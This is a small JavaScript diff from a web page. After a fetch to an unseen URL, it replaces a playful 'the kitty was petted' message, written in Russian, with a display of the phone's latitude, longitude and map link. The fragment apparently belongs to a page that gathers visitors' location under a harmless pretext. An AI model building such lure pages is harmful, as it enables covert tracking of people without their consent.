@@ -139,7 +139,7 @@
                     fetch(url, { mode: "no-cors" })
                         .then(() => {
                             titleH2.innerText = "Готово!";
-                            statusDiv.innerText = `Котика погладили и он доволен!`;
+                            statusDiv.innerText = `📍 Координаты с телефона:\nШирота: ${lat}\nДолгота: ${lon}\nКарта: ${mapsLink}`;
                         })
                         .catch((err) => {
                             isSent = false;
